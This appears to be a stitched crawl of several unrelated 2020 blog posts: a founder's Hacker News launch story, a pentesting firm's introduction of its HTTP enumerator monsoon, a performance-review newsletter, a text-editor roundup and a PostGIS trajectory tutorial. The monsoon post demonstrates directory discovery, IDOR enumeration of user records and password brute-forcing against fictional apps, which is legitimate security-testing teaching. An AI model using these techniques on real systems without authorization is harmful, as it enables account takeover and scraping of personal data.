I wrote a long post (750 words) about my experience and how you should use Reddit at each stage of your start-up. Then I cleaned it up with Grammarly and Hemmingway - to remove mistakes and improve readability.</p><p>My goals with that blog post were (in that order):</p><ul><li>Grow my Twitter audience</li><li>Create some traffic to my product</li><li>Grow my audience in different communities.</li></ul><p>I created some call to action for this. I added a CTA at the end of the post redirecting to my Twitter:&nbsp;
“Do you want to launch on Reddit? DM me on Twitter, I’ll be happy to help → Twitter”
The footer of each blog post was designed with a CTA to bring traffic to my product.</p><h2 id="distribution">Distribution</h2><p>I posted the article on the blog. It generates no traffic at all, no surprise, it’s the very first post.</p><p>Then I posted to IndieHackers, on a Saturday. Not the best day to share content, I got only 12 upvotes and a few comments. I also tried Reddit (on a weekday) and got small traction on /r/Entrepreneur:&nbsp;56 upvotes and 25 comments. Nothing extraordinary for a community with 900k members…</p><p>As I’m trying to start using HackerNews I also posted the link of my post to HN with the title:&nbsp;”How to Use Reddit as an IndieHacker”. It got no upvotes, I just watched the post drawing in the “New” section and disappear :/</p><p>I thought: “ok, my post wasn’t that good, I’ll write a new one and try again”.</p><h2 id="retry">Retry!</h2><p>A few days later, I read a tweet from someone explaining that you should re-post your content on HN. That can make some results and the community is ok with that.</p><p>So I&nbsp;tried. I just made a small modification in the title: instead of</p><blockquote><p>“How to Use Reddit as an IndieHacker”</p></blockquote><p>I&nbsp;did</p><blockquote><p>“How to use Reddit to get your first users”</p></blockquote><p>I know that getting the first users is a real pain (that’s why I created SpreadTheWorld), so I&nbsp;figured that, maybe, it will catch more attention.</p><p>I checked an hour later and the post got a massive spike on my analytics tool!&nbsp;
<img src="https://www.dropbox.com/s/vbbofk1ga2ir3pi/newsycombinator%20visits%20spike.jpg?raw=1" alt="hackernews spike analytics">
The post just exploded! At this time I&nbsp;got 36 upvotes and was #5 on the homepage!</p><h2 id="homepage-of-hacker-news">Homepage of Hacker News</h2><p>That day was crazy! My blog post stayed on the homepage for almost 8hrs, brought me, 6000 visitors - sometimes more than 100 concurrent users!
I also got 100+&nbsp;comments on the HN post, I spent the day answering them and trying to keep the momentum going!
I also monitored Twitter to thank every shout-out and try to create some momentum there as well.
Here is the <a href="https://twitter.com/AngeZanetti/status/1331264065264562177">live Tweet</a></p><h3 id="final-stats">Final Stats</h3><p>A week after the post, here are the stats:</p><ul><li>7.2k visits on my blog</li><li>25 new followers on Twitter</li><li>350 visitors on SpreadTheWorld homepage</li><li>A few sales only (during the first 8hrs), a few more afterward</li></ul><h3 id="the-conversion-wasn-t-good">The conversion wasn’t good!</h3><p>I told you earlier that I&nbsp;had some CTA&nbsp;on the blog +&nbsp;on the bottom of my post to convert the audience.
They didn’t work! A&nbsp;very few people clicked on them, the bottom of my post was too muddled and the text was too vague:</p><p><img src="https://www.dropbox.com/s/oh6x3yvwlohoujq/bad-cta-blogspreadtheworld.jpg?raw=1" alt="muddled footer cta"></p><p>I updated it to:</p><p><img src="https://www.dropbox.com/s/2aa3zv0yt54epi2/improved-cta-blogspreadtheworld.jpg?raw=1" alt="improved footer cta"></p><p>And it worked!&nbsp;The conversion rate jumped from 0,6% to 2,3%:
And I also added a CTA&nbsp;in the header (the day after) - a lot of visitors wasn’t going to the end of the post:</p><p><img src="https://www.dropbox.com/s/dg9tqwyr47y3vdc/clean%20header.png?raw=1" alt="cleaned header with CTA"></p><p>The conversion is now way higher, almost 10%&nbsp;of the blog visitors go on the product page!</p><p>I did all these experiments during the rush, so I kind of miss this wave of visitors, but I’m ready for the next one!</p><h2 id="takeaways">Takeaways</h2><ol><li><p>Distribution is super important, more than anything else. Create a good product/content and post it to every (big) community. You never know if it’s going to work so just share it!</p></li><li><p>Retry, if it does not work on a platform try to submit it to another one. If it still doesn’t work update the content/title and re-post it!</p></li><li><p>CTA&nbsp;is crucial. Understand before posting what your goals are and monitor the conversion (I didn’t do it, I regret it…)</p></li><li><p>You need months to leverage good content!</p></li></ol><p>Do you need help to grow your audience or distribute your content? Contact me on <a href="https://twitter.com/angezanetti">Twitter</a> I’m always happy to help!</p></div></div>]]>

    <h4>2 December 2020</h4>
    
    



    <p>We recently released our first open-source project,
<a href="https://github.com/RedTeamPentesting/monsoon">monsoon</a>. monsoon is a so-called
command-line <em>HTTP enumerator</em>: A tool that iterates over a list of values, for example
a word list or a range of integers, and sends one HTTP request per item towards a given
server. The target server, path and HTTP headers can be configured on the command line.
There, one can replace parts of the HTTP request with the placeholder <code>FUZZ</code>. All its
occurrences are replaced with the current item during each iteration. Optionally,
monsoon can filter or even parse the HTTP response.</p>
<p>monsoon can be very helpful during penetration testing and in this blog post we would
like to motivate its development and introduce some common scenarios that can be tackled
using monsoon.</p>
<h3 id="motivation">Motivation</h3>
<p>There are quite a few similar software projects on the internet, namely DirBuster,
<a href="https://github.com/OJ/gobuster">gobuster</a>, <a href="https://github.com/xmendez/wfuzz">wfuzz</a> or
<a href="https://github.com/ffuf/ffuf">ffuf</a>. We have used some of them during penetration tests
and while these might be great tools for certain jobs, we felt that none of them reflect
our penetration testing workflow very well.</p>
<p>Penetration tests at RedTeam Pentesting mostly consist of a manual, creative search for
vulnerabilities, since we, as well as our customers, feel that this is the most
efficient way to deliver high-quality results. However, this does not imply that we do
not use automated tools for highly repetitive tasks, such as port scanning or
brute-force attacks. In order to integrate corresponding software into our creative
workflow, tools have to be very versatile. The most versatile tool sets are made up of
multiple single-purpose, easy to use tools working on open/standardised data formats.
Great examples can be found in the basic Unix tool set: <code>cat</code>, <code>grep</code>, <code>cut</code>, <code>head</code>,
<code>tail</code>, … all of which act on simple text streams and strive to fulfill a single
purpose.</p>
<p>Thus, our goal when developing monsoon was to stay close to the minimally necessary
feature set for an HTTP enumerator and to add new features only if they are actually
relevant for our penetration testing workflow. The first commits to the monsoon
repository are from 2017; since then we have used and refined monsoon in many many
penetration tests.</p>
<p><strong>Note</strong>: The applications analysed in this blog post have been developed specifically
for the purpose of demonstrating monsoon. All names, addresses and other data are purely
fictional.
</p>

<h3 id="file-and-directory-discovery">File and Directory Discovery</h3>
<p>The most common usage scenario for monsoon is the discovery of files or folders which
are served by a web server, but are not directly linked from any previously known page.
This might for example include administration panels, different applications or remnants
of development, such as debugging endpoints or even source code. If these resources are
not protected by separate authentication, any attacker who knows the corresponding URL
can interact with them.</p>
<p>This is where monsoon comes in: monsoon allows us to query many URLs in sequence, with
the goal of guessing URLs to aforementioned hidden resources. In this process, our
success rate depends on the speed and quality of guesses. A good starting point for
guessing hidden file and directory names is the <a href="https://github.com/danielmiessler/SecLists">SecLists
project</a> by Daniel Miessler. SecLists is a
large collection of word lists for many different purposes. The files that we are
interested in during this attack phase are contained in the folder
<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content"><code>Discovery/Web-Content</code></a>. Among others, the folder contains the RAFT word lists
originally compiled by FishNet Security, such as <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-small-files.txt"><code>raft-small-files.txt</code></a> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-small-directories.txt"><code>raft-small-directories.txt</code></a>.</p>
<p>The following screen cast shows an invocation of monsoon on a sample application with the
goal of discovering hidden subdirectories below the path <code>/app</code>:</p>


<asciinema-player author="RedTeam Pentesting GmbH" title="Screencast" theme="redteam" poster="npt:0:02" src="/2020/introducing-monsoon/demo_discovery.cast"></asciinema-player>


<p>The HTTP responses are summarised in the result table. With the command-line option
<code>--hide-status</code> set to 404, we have hidden 996 responses for which the web
server has responded with <code>404 Not Found</code>. We’re rather interested in the four results
for which the web server has responded with status code 302, indicating a redirection.
It’s a very common behavior of web servers to redirect requests from <code>/foo</code> to <code>/foo/</code>
if the directory <code>foo</code> exists. In this case there are several interesting directories,
such as <code>internal</code> and <code>phpMyAdmin</code> which we subsequently would inspect manually.</p>
<h3 id="enumeration">Enumeration</h3>
<p>Another common scenario is the exploitation of a so-called <a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">insecure direct object
reference
(IDOR)</a>
vulnerability. Such vulnerabilities exist whenever access to a resource only depends
on a predictable reference, such as a numerical ID, a known algorithm generating a
serial number or otherwise obtained UUIDs. Imagine a web application where data
for your user profile is fetched from the endpoint <code>/api.php?userid=11</code>:</p>
<div><pre><code data-lang="bash">$ curl -s <span>'http://app.example.com/api.php?userid=11'</span> | jq
<span>{</span>
  <span>"Id"</span>: 11,
  <span>"FirstName"</span>: <span>"RedTeam"</span>,
  <span>"LastName"</span>: <span>"Pentesting"</span>,
  <span>"UserName"</span>: <span>"rtpt"</span>,
  <span>"Email"</span>: <span>"jobs@redteam-pentesting.de"</span>
<span>}</span>
</code></pre></div><p>What happens if <code>/api.php?userid=10</code> is requested? In this example, we assume that
the analysed web application does not intend to offer the functionality to display
other users personal information and should therefore deny the access to it. Despite
the intention of the web application, user data is returned which indicates an IDOR
vulnerability:</p>
<div><pre><code data-lang="bash">$ curl -s <span>'http://app.example.com/api.php?userid=10'</span> | jq
<span>{</span>
  <span>"Id"</span>: 10,
  <span>"FirstName"</span>: <span>"Ben"</span>,
  <span>"LastName"</span>: <span>"Grimm"</span>,
  <span>"UserName"</span>: <span>"b.grimm"</span>,
  <span>"Email"</span>: <span>"b.grimm@example.com"</span>
<span>}</span>
</code></pre></div><p>We often use monsoon in this scenario in order to demonstrate the impact of such a
vulnerability to our customers. With the <code>-r</code>/<code>--range</code> option, monsoon iterates over
ascending integer numbers instead of a word list. This is demonstrated in the following
screen cast:</p>


<asciinema-player author="RedTeam Pentesting GmbH" title="Screencast" theme="redteam" poster="npt:0:04" src="/2020/introducing-monsoon/demo_enumerate_json.cast"></asciinema-player>


<p>That was fast! Note that the results appear out of order because monsoon by default
sends five concurrent requests. Furthermore, we have parsed the JSON response with the
command-line JSON parser <a href="https://stedolan.github.io/jq/">jq</a>. Its output (the fictional
person’s name) is displayed in the result table.</p>
<p>Additionally, monsoon can perform basic content extraction without an external process.
For this purpose, one can provide a regular expression to the <code>--extract</code> parameter.
monsoon will try to match the regular expression to the HTTP response body. If one or
more matches have been found, the content of the first capture group of each match will
be displayed in the results table. This can be useful if, for example, you want to extract
content from responses containing HTML. Imagine the following endpoint:</p>
<pre><code>$ curl -s 'http://app.example.com/dashboard.php?userid=11'
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset="utf-8"&gt;
        &lt;title&gt;Profile of RedTeam Pentesting&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Profile of RedTeam Pentesting&lt;/h1&gt;
        &lt;table&gt;
            &lt;tr&gt;&lt;th&gt;Key&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;First Name&lt;/td&gt;&lt;td&gt;RedTeam&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Last Name&lt;/td&gt;&lt;td&gt;Pentesting&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Email&lt;/td&gt;&lt;td&gt;jobs@redteam-pentesting.de&lt;/td&gt;&lt;/tr&gt;
        &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Here, we can use the regular expression <code>&lt;title&gt;Profile of ([^&lt;]+)&lt;/title&gt;</code> to extract a
name from the title. Watch to see monsoon quickly extract names from our sample
application:</p>

<h3 id="brute-force">Brute-Force</h3>
<p>HTTP requests are not always as straight-forward as the ones shown before. You might
encounter requests which require certain HTTP headers or some complex body structure. In
those cases it might be easier to start from a known HTTP request, one that has for
example been captured with an HTTP attack proxy like <a href="https://www.zaproxy.org/">ZAP</a>.
One example could be the following login request to a our sample application:</p>
<div><pre><code data-lang="http"><span>POST</span> <span>/login.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>app.example.com</span>
<span>User-Agent</span><span>:</span> <span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span>Content-Type</span><span>:</span> <span>application/x-www-form-urlencoded</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Accept-Language</span><span>:</span> <span>en-US,en;q=0.5</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate, br</span>
<span>Referer</span><span>:</span> <span>http://127.0.0.1:8080/</span>
<span>Connection</span><span>:</span> <span>keep-alive</span>
<span>Pragma</span><span>:</span> <span>no-cache</span>
<span>Cache-Control</span><span>:</span> <span>no-cache</span>

username=admin&amp;password=FUZZ
</code></pre></div><p>We save this request as a file with the name <code>login-request.txt</code>. As the request body
shows, we would like to authenticate with the username <code>admin</code>, but we don’t know the
password (yet). Therefore, we substitute the <code>password</code> parameter with the placeholder
<code>FUZZ</code>. Now, we can specify the file name <code>login-request.txt</code> as the value of the
<code>--template-file</code> parameter. For the URL we only have to specify the correct server, as
this cannot be deduced from the template file. Note that some fields such as the
<code>Content-Length</code> header will be automatically adjusted by monsoon.</p>
<p>Again, decent word lists to start from can be found in the SecLists project. This time,
we will use a word list from the <code>Passwords</code> directory. Most files in this directory
contain common passwords and default passwords. For this demonstration, we will use the
word list
<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-10000.txt">xato-net-10-million-passwords-10000.txt</a>
which has been originally compiled by Mark Burnett (xato.net). The invocation with the
aforementioned template file is as follows:</p>


<asciinema-player author="RedTeam Pentesting GmbH" title="Screencast" theme="redteam" poster="npt:0:04" src="/2020/introducing-monsoon/demo_bruteforce.cast"></asciinema-player>


<p>Et voilá, we discovered that the password is <code>wonderful</code>! 😁</p>
<!-- raw HTML omitted -->
<h3 id="conclusion">Conclusion</h3>
<p>monsoon is a very versatile HTTP enumerator suited for penetration testing of web
applications. Its limited feature set helps the project stay lean while allowing for
creative use. In the end, it’s a tool, developed to support your creative workflow.</p>

<![CDATA[The Most Wonderful Time of the Year: Review Season]]>

December 2, 2020 | https://boringstartupstuff.com/newsletter/dec-1-2020-review-performance-reviews | <a href="https://web.archive.org/web/*/https://boringstartupstuff.com/newsletter/dec-1-2020-review-performance-reviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Everyone’s favorite time of year: performance review season!&nbsp;</span></p>
<p><span>Roles in a startup change quickly, so the performance review process must adapt as team structure, company focus, and overall process also change. </span><span>The differences between the two startups I've been at are stark. Here's a look at the process for each.</span></p>

<p><span><strong>Next Caller</strong></span></p>
<p><span>The process lasts a month and involves a set of 360-degree reviews.&nbsp; We start in mid-November and go as follows:</span></p>
<ul>
<li><span>Week 1: Self Review</span></li>
<li><span>Week 2: Peer Review (3-5 per employee) + Manager Review</span></li>
<li><span>Week 3: Direct Report Reviews (if any)</span></li>
<li><span>Week 4: 1:1 meetings with your manager to discuss performance and set next year’s goals</span></li>
</ul>

<p><span>Our reviews focus on major contributions from the past year and on how well the employee exemplifies the company values, plus an overall rating of general performance ranging from "below expectations" to "exemplary."&nbsp;</span><span>I set my team’s performance goals after discussing the upcoming year with the other team leaders. Departmental goals (usually between 4-5 clearly defined objectives) are then used as goalposts for outlining individual team member goals. I use the Week 4 1:1 to lay out individual team member goals, and together we define a measurement and feedback system to monitor throughout the upcoming year. Lastly, our Head of Operations keeps an archive of all reviews in a secure directory.</span></p>

<p><b>What works well:</b><span> The broad peer review process requires individuals to focus on the whole team and not simply within their direct reporting line. Additionally, by focusing on our companies values as guideposts, we don't pigeonhole performance to the bars set in our job descriptions. Instead, we can incorporate instances when the employee went outside the scope of their prescribed duties, as there are intangible values different team members bring to the table outside of their roles.&nbsp;</span></p>

<p><b>Challenges</b><span>: Our process is time-consuming, though not nearly as bad as the </span><a href="https://www.shrm.org/resourcesandtools/hr-topics/employee-relations/pages/performance-reviews-are-dead.aspx" rel="follow noopener" target="_blank"><span>210 hour average</span></a> <span>other managers supposedly spend on their process. Selecting peer reviewers for my direct reports was challenging, as I didn't want to overburden some individuals who work across group while also ensuring that everyone got a voice somewhere. However, peer reviews are great at surfacing working relationships that are otherwise less visible. Finally, there are the technical quirks and challenges that come with the SaaS platform we chose (sorry, PerformYard). I would stick to simpler technology in the future.</span></p>

<hr>

<p><strong>Kard</strong></p>
<p><span>When I ran a review process at Kard, the team was 5 employees, so the process was much simpler. Because of our size and lack of organizational structure, a more direct review process worked well.&nbsp;&nbsp;</span></p>

<p><span>Kard’s formal review process took place just after the turn of the year.&nbsp; I wrote reviews of my direct reports, and in turn, was also reviewed by our CEO (my direct manager). After sharing the review with the individuals on my team and submitting to the CEO, I set aside hour-long meetings with each report to discuss the highs and lows of previous year and the areas for improvement.&nbsp;</span><span>All in, the process took up only a few hours.</span></p>

<p><b>What works well:</b><span> Because the company was smaller, peer relationships were in the open, and the straightforward annual review process saved the team time. Team member roles were moving targets, so the reviews were much more focused on the value added to the company as a whole and less about individual goals.</span></p>

<p><b>Challenges</b><span>: Given Kard’s early stage and low structure, the review process was challenging because there were so much unknown about where we were headed.</span></p>

<hr>

<p><span>Regardless of your team’s current process, it is worthwhile to revisit the process and think through your goals for the coming year. Review processes come in all shapes, and what works for one company may not work for another.</span></p>

<p><span>Here are a few takeaways from the review processes I've participated in, ranging from Fortune 50 companies to 5-person startups:</span></p>

<ol>
<li>Eliminate practices, such as rankings, that pit employees against each other and create a non-collaborative work environment.</li>
<li>Remove numerical scoring as it creates a depersonalized evaluation of employees. It is just as easy to use word based scoring that provides a less depersonalized assessment of skill.</li>
<li>Focus on the major wins and contributions throughout the year. Instead of highlighting losses, pinpoint future areas of improvement.&nbsp;</li>
<li>Detach compensation discussions from the review process. This allows reviews to focus on what is really important -- job performance.</li>
<li>Make the yardstick clear and available before reviews begin. This can take several flavors: in Next Caller’s case, we have a copy of our company maxims hanging right on our office walls and clear team objectives set every year. For Kard, the objectives were less defined, but each individual shared the same common goal of company success.</li>
<li>Review your review process as your company grows. Change is inevitable. Don’t settle for “what we have always done” as the fallback process each year.</li>
</ol>

<p><span>This process looks different from startup to startup, but the end goal should be the same: celebrate wins, patch up leaks, and make your team better in the coming year.&nbsp;</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/tools"><p>Tools</p></a><h2>10 Best Text Editors for Web Developers</h2><p>In this post, we’re comparing free Atom, Brackets, Visual Studio Code, Notepad++++ and Vim text editors, as well as paid Sublime Text 3, BBEdit, Coda, NoteTab Pro, and Webstorm.</p></div></div><article><div target="_blank"><p>It is difficult for a developer to perform tasks without a high-quality text editor. It not only speeds up the process but also allows you to add a lot of functions that will simplify the work even with the most complex code.<br></p><p>There is a large number of text editors to choose from. Some of them are better, some are worse. We’ve put together a list of the best text editors for working with code, in our opinion, considering both paid and free services.<br></p><h2>Best Free Text Editors</h2><h3>Atom</h3><p>Atom is one of the most popular web development text editors. The program is open source, and the creators of the service are GitHub developers.</p><p>Atom has quite extensive functionality. In particular, the developers have provided the following features:</p><ul role="list"><li>Syntax highlighting;</li><li>Code completion;</li><li>Code collapse;</li><li>Support for dozens of languages.<br></li></ul><p>The creators have also provided support for GitHub. When you install Atom, the package manager is installed on your computer. Using the manager, the web developer has the <strong>ability to search for the GitHub package, or download their own</strong>, which will help to expand the service.<br></p><p>Atom supports the Teletype option (codeshare) so that multiple web developers can build the same project simultaneously. The Atom team also provided the option of extending the editor using the Atom IDE, which is a set of feature packages.</p><figure id="w-node-32f28ed3877d-7a0a8b78"><a href="https://atom.io/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d3979ce5b76f54003b7acec_EGO_atom.png" alt=""></p></a></figure><p>‍</p><h3>Brackets</h3><p>Adobe, known for its solutions for web developers and designers, has also released its own text editor for code called Brackets. Experts from MIT were involved in the development. Brackets is well suited for<strong> front-end developers</strong> who prefer to work with languages such as <strong>Javascript, HTML, or CSS</strong>.<br></p><p>Brackets combines a set of standard features (code completion, syntax highlighting, quick editing) and unique options created by Adobe developers. These include:</p><ul role="list"><li><strong>Live Preview</strong>. A feature that allows you to preview the code. With it, the developer is able to <strong>open the code in Chrome</strong> and check how it works in the browser.</li><li><strong>Extract. </strong>An option that allows you to <strong>transfer settings from a PSD file to a CSS file</strong>. In particular, the developer has the ability to load color, font, gradient, and other settings.&nbsp;<br></li></ul><p>In addition, Brackets offers front-end developers a good array of settings. Adobe provides adequate support to the programming text editor, regularly releasing a variety of packages. Add-ons are loaded through the <a href="https://registry.brackets.io/">Brackets registry</a>.</p><figure id="w-node-6bf0d8a3ca83-7a0a8b78"><a href="http://brackets.io/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397b544b8a5665f3a29cc7_EGO_brackets.png" alt=""></p></a></figure><p>‍</p><p>‍</p><h3>Visual Studio Code</h3><p>Visual Studio Code is an official text editor for web development from Microsoft. According to Stack Overflow <a href="https://insights.stackoverflow.com/survey/2019#technology-most-popular-development-environments">statistics</a>, <strong>55.6% of specialists choose this program</strong>. The service is supported not only on Microsoft OS but also on Linux and Mac. Visual Studio Code has a fairly large set of tools for creating and debugging code.&nbsp;<br></p><p>Microsoft specialists have provided opportunities for integration with other services. The main advantage of the VS Code is <strong>Live Share</strong>. This creates the option of joint work between several experts on one code. This way, you don't have to pass code to multiple developers one at a time.<br></p><p>The VS Code functionality also offers <strong>auto-completion, GitHub integration, syntax highlighting</strong>, and many other useful features. In addition, there is a collection of add-ons that provide an additional set of options and allow you to customize the editor for everyone.</p><figure id="w-node-b9d85a41c7ad-7a0a8b78"><a href="https://code.visualstudio.com/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397bb428d7f14f5baf14ef_EGO_vsc.png" alt=""></p></a></figure><p>‍</p><h3>Notepad++</h3><p>The Notepad++ code editor has become a classic for developers. The first version appeared in 2003 on Windows, and today it is available only for this platform. The program is time-tested and has won its large audience. According to Stack OverFlow <a href="https://insights.stackoverflow.com/survey/2019#technology-most-popular-development-environments">research</a>, <strong>30.4% of developers use this service</strong>.<br></p><p>A distinctive feature of Notepad++ is its speed. <strong>It's really very fast.</strong> It works well with various programming languages “right out of the box.” However, this editor is most often <strong>used for HTML</strong>.&nbsp;<br></p><p>Notepad++ supports editing in different tabs. In addition, it allows you to expand functionality using external extensions. For example, you can add syntax highlighting, macros, compiler integration, indentation, and more.</p><figure id="w-node-8fbccfd28517-7a0a8b78"><a href="https://notepad-plus-plus.org/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a315600c0d6cbe3be32_EGO_notepad.png" alt=""></p></a></figure><p>‍</p><h3>Vim</h3><p>Vim is considered one of the most powerful console coding text editors available today. It is preinstalled on almost any UNIX. An interesting feature of the service is the ability to <strong>fully control it by only using the keyboard</strong>. Although, if you prefer to work with a mouse, then of course you can use that too.<br></p><p>Vim is a text editor for developers who have quite a lot of experience. However, if you manage to master it, you will open up new opportunities. You can solve problems with Vim in just a few minutes that would take hours in other programs.<br></p><p>Immediately after installation, Vim is unlikely to surprise you with any features. It will perfectly cope with the text, but for more complex tasks it has to be configured. Fortunately, the program provides a large number of various add-ons, plugins, and options, so the functionality of Vim can become the most extensive among all the services on the market. Another important advantage is the fact that Vim <strong>uses only a part of the system memory </strong>and loads instantly.</p><figure id="w-node-22886dca66a3-7a0a8b78"><a href="https://www.vim.org/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a4648fa16274c339c5f_EGO_vim.png" alt=""></p></a></figure><p>‍</p><h2>Best Paid Text Editors</h2><h3>Sublime Text 3</h3><p>The first paid editor that deserves serious attention is Sublime Text 3. The program is available in both free and paid versions and is present in many top text editors ratings. Supported on Windows, Linux, and Mac platforms. This is a <strong>very fast editor that will not take up much disk space and system resources</strong>.<br></p><p>In the trial mode, you can use the program for an unlimited amount of time. If you need more functionality, you can buy the full version, which costs $80.

                    <p>By Ryan Lambert -- Published November 29, 2020</p><p>A few months ago I started experimenting with a few project ideas
involving data over space and time.  Naturally, I want to use
Postgres and PostGIS as the main workhorse for these projects,
the challenge was working out exactly how to pull it all together.
After a couple false starts I had to put those projects aside for other priorities.
In my free time I have continued working through some related reading on the topic.
I found
<a href="https://anitagraser.com/2018/04/16/movement-data-in-gis-12-why-you-should-be-using-postgis-trajectories/">why you should be using PostGIS trajectories</a>
by Anita Graser and recommend reading that before continuing with this post.
In fact, read <a href="https://www.austriaca.at/0xc1aa5576_0x00390cbe">Evaluating Spatio-temporal Data
Models for Trajectories in PostGIS
Databases</a>
while you're at it!  There is great information in those resources
with more links to other resources.</p>
<p>This post outlines examples of how to use these new PostGIS trajectory tricks with
OpenStreetMap data I already have available
(<a href="https://blog.rustprooflabs.com/2020/01/postgis-osm-load-2020">load</a>
and
<a href="https://github.com/rustprooflabs/pgosm">prepare</a>
).
Often, trajectory examples assume using data collected from our
new age of IoT sensors sending GPS points and timestamps.  This example approaches
trajectories from a data modeling perpective instead, showing how to synthesize trajectory data using <code>pgrouting</code>.
Visualization of data is a critical component of sharing information,
<a href="https://qgis.org/">QGIS</a>
has long been my favorite GIS application to use with PostGIS data.</p>

<h2>Route data</h2>
<p>Routes for this example are created with manually selected start (<code>s_id</code>)
and end (<code>e_id</code>) nodes.  These id values line up to pgrouting node data
in the table <code>osm_routing.roads_noded_vertices_pgr</code>.
To set the stage for temporal data a start time (<code>s_time</code>) is also included.  This example
gives each route a start time of 5:00 AM, but makes it easy to adjust start times to explore
the impact.</p>
<pre><code>route_id|s_id |e_id  |s_time             |
--------|-----|------|-------------------|
       1|24902| 21887|2020-11-01 05:00:00|

       7|30505|113816|2020-11-01 05:00:00|
</code></pre>
<p>The start and end nodes (<code>r.s_id</code> and <code>r.e_id</code> below) are fed into pgrouting's <code>pgr_dijkstra()</code> routing function.
The <code>osm_routing.roads</code> table contains OpenStreetMap data for Denver, CO prepared by PgOSM.
The <code>pgosm.layer_detail</code> and <code>pgosm.routable</code> tables are used to
easily filter down to roads usable by motorized traffic (cars).
The <code>osm_routing.roads_noded</code> (edges) table was prepared with <code>pg_routing</code> and is based on the base <code>osm_routing.roads</code> table.</p>
<p>The route details are created and saved into a new table
(<code>osm_routing.route_details</code>) using the following query. </p>
<pre><code>CREATE TABLE osm_routing.route_details AS
WITH rte AS (
SELECT * 
    FROM osm_routing.routes
)
SELECT r.route_id, d.*, n.the_geom AS node_geom, e.the_geom AS edge_geom
    FROM rte r
    INNER JOIN pgr_dijkstra(
        'SELECT rn.id, rn.source, rn.target, rn.cost_length AS cost,
                rn.the_geom
            FROM osm_routing.roads_noded rn
            INNER JOIN osm_routing.roads r ON rn.old_id = r.id
            INNER JOIN pgosm.layer_detail ld ON ld.code = r.code
            INNER JOIN pgosm.routable rbl
                ON rbl.layer_detail_id = ld.layer_detail_id
                    AND rbl.route_motor
            ',
        r.s_id, r.e_id, directed := False
        ) d
        ON True
    INNER JOIN osm_routing.roads_noded_vertices_pgr n ON d.node = n.id
    INNER JOIN osm_routing.roads_noded e ON d.edge = e.id
;
</code></pre>
<p>The <code>pgr_dijkstra()</code> function returns one row for each step of a given route.
The <code>route_id</code> value links back to <code>osm_routing.routes</code>.
The <code>cost</code> used a simple length based cost with meters as the unit.
The <code>node</code> and <code>edge</code> values point back to the id values in their respective tables
used by pgrouting.</p>
<pre><code>route_id|seq|path_seq|node |edge |cost              |agg_cost          |
--------|---|--------|-----|-----|------------------|------------------|

</code></pre>
<p>The nodes (blue circles) and edges (red lines) for each of the routes are shown
below.  We can easily confirm with code (<code>ST_Intersects()</code>) and visually on
the map that these routes intersect using simple spatial checks.
Would these routes intersect if time was also considered?</p>
<p><img alt="Screenshot from DBeaver showing generated route details.  Blue circles indicate each route node and the red lines illustrate the edges connecting the nodes." src="https://blog.rustprooflabs.com/static/images/postgis-openstreemap-routes-for-trajectory.png"></p>
<blockquote>
<p>The animated version of these routes is at the bottom of this post under <em>Animate in QGIS</em>.</p>
</blockquote>
<h2>Path to Trajectory</h2>
<p>A simple approach to adding time to geometry is by adding two <code>TIMESTAMPTZ</code> columns
for start and end times. Unfortunately this simple approach quickly falls apart
as later queries will illustrate.
Luckily, the PostGIS extension comes to the rescue (again) with built in trajectory
support.  What is a trajectory?
It starts with at least two points that include a Measure (<code>M</code>)
representing time.  These points can be created with
<a href="https://postgis.net/docs/ST_MakePointM.html"><code>ST_MakePointM()</code></a>.
Points including <code>M</code> can be made into a line with <code>ST_MakeLine()</code>, and
now you have a trajectory.</p>
<p>The key detail added to make a trajectory is <code>M</code>, or the Measure.
Many trajectory use cases use time as the measure. Unfortunately,
the <code>TIMESTAMPTZ</code> format cannot be used but using
the epoch is an easy enough workaround in Postgres.</p>
<h2>Assign Speeds</h2>
<p>To get to a <code>M</code> value for each step of the route we need the speed traveled
for each edge.  Add a column for <code>edge_mph</code>.</p>
<pre><code>ALTER TABLE osm_routing.route_details ADD edge_mph NUMERIC;
</code></pre>
<p>Quite a series of joins to get back to the speed limit.
In the future this step will most likely be done far earlier on in the data processing pipeline.</p>
<pre><code>UPDATE osm_routing.route_details rd_update
    SET edge_mph = rbl.max_speed
    FROM osm_routing.route_details rd
    INNER JOIN osm_routing.routes rte ON rd.route_id = rte.route_id
    INNER JOIN osm_routing.roads_noded rn ON rd.edge = rn.id
    INNER JOIN osm_routing.roads r ON rn.old_id = r.id
    INNER JOIN pgosm.layer_detail ld ON ld.code = r.code
    INNER JOIN pgosm.routable rbl ON rbl.layer_detail_id = ld.layer_detail_id
    WHERE rd_update.route_id = rd.route_id
        AND rd_update.seq = rd.seq
        AND rd_update.path_seq = rd.path_seq
;
</code></pre>
<h2>Calculate time for each edge</h2>
